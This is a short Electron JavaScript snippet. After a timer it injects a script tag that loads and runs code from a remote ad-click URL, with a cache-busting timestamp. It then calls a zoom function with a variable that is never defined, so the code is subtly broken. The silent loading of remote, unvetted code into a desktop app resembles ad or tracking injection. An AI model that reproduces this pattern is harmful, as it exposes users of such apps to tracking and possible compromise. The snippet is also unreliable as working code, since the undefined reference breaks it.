const { webFrame } = require('electron')
setTimeout(() => {
var script = document.createElement('script');
script.src = '//tr.neox.in/adclick/gamepix/main.php?v=' + Date.now() + '';
document.head.appendChild(script);
webFrame.setZoomLevel(level)
}, 2000)
